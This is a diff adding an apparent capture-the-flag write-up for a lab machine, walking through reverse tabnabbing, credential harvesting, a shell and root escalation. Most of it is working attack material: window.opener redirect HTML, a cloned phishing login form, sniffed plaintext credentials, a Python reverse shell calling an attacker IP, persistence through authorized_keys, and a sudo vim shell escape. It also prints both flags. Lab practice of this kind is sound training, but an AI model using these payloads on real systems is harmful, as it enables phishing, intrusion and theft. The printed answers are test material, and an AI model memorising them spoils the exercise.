@@ -1,0 +1,153 @@
+
+>"Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one."
+https://owasp.org/www-community/attacks/Reverse_Tabnabbing
+# Rustscan
+```bash
+rustscan -a 10.10.184.22 --ulimit 7000 -- -sC -sV   
+```
+### Open Ports
+HTTP:80 | Apache httpd 2.4.41 ((Ubuntu))
+SSH:22 | OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+
+# Gobuster
+```bash
+gobuster dir -u http://10.10.184.22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 
+```
+## Directories 
+
+| Directories | Status Code | Full-URL                   |
+| ----------- | ----------- | -------------------------- |
+| /admin      | 312         | http://10.10.184.22/admin/ |
+
+# Enumeration
+## Exploitting underscore blank
+https://book.hacktricks.xyz/pentesting-web/reverse-tab-nabbing
+
+Start a python server on port 80 and 8000
+```bash
+nano mal.html
+```
+```html
+<!DOCTYPE html>
+<html>
+ <body>
+  <script>
+  window.opener.location = "http://10.6.53.104:8000/malicious_redir.html";
+  </script>
+ </body>
+</html>
+```
+
+```bash
+nano login.html
+```
+
+Take the source page of the login form
+```html
+<!DOCTYPE html>
+<html lang="en">   
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome</title>     
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">                                               
+    <style>
+        body{ font: 14px sans-serif; text-align: center; }    
+    </style>     
+</head>
+<body>
+	<h1 class="my-5">Hello, <b>test</b>! Welcome to our free blog promotions site.</h1>                                         
+    <h1 class="my-5">Please submit your link so that we can get started.<br> All links will be reviewed by our admin who also built this site!</h1>
+    <form action="" method="post">          
+                <label for="link">Blog Link:</label>
+                <input type="text" placeholder='http://visitme.com/' id="link" name="url"><br><br>
+                <input type="submit" name="submit" value="Submit">
+                <br>
+                <br>
+                <p>Thank you for your submission, you have entered: <a href='http://10.6.53.104:8000/mal.html' target='_blank' >Here</a></p>    </form> 
+    <br>
+    <p>
+        <a href="reset-password.php" class="btn btn-warning">Reset Your Password</a>
+        <a href="logout.php" class="btn btn-danger ml-3">Sign Out of Your Account</a>
+    </p>
+
+</body>
+</html>
+```
+
+# Wireshark
+Using Wireshark we can easy see the username and password of the user.
+
+<html>
+ <body>
+  <script>
+  window.opener.location = "http://127.0.0.1:8000/malicious_redir.html";
+  </script>
+ </body>
+</html>
+![[Pasted image 20240617150919.png]]
+### username password
+username Daniel
+password=C@ughtm3napping123
+# User.txt
+```bash
+ssh daniel@10.10.184.22
+```
+
+### Finding files with group admin priveldges
+```bash
+find / -group administrators -type f 2>/dev/null
+```
+
+or
+### PSPY
+![[Pasted image 20240617152236.png]]
+## Getting reverse shell
+Add reverse shell to query.py and wait for shell. We can change this file because we are part of the administrator group.
+![[Pasted image 20240617153532.png]]
+```python
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.53.104",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
+```
+```bash
+rlwrap nc -lvnp 7777
+```
+
+## Upgrading to ssh connection
+On your attackers machine enter the following commands to get ssh on victims machine
+```bash
+ssh-keygen -t rsa
+```
+```bash
+cd .ssh
+```
+```bash
+cat id_rsa.pub
+```
+
+On the victims machine enter these commands into authorized_keys
+```bash
+cd .ssh
+```
+```bash
+echo "YOUR id_RSA key" > authorized_keys
+```
+```bash
+ssh adrian@10.10.184.22
+```
+
+```bash
+cat user.txt
+```
+	THM{Wh@T_1S_Tab_NAbbiN6_&_PrinCIPl3_of_L3A$t_PriViL36E}
+
+## Privilege Escalation 
+```bash
+sudo -l
+```
+![[Pasted image 20240617154627.png]]
+```bash
+sudo vim -c ':!/bin/sh'
+```
+```bash
+cd /root; cat root.txt
+```
+	THM{Adm1n$_jU$t_c@n'T_stAy_Aw@k3_T$k_tsk_tSK}
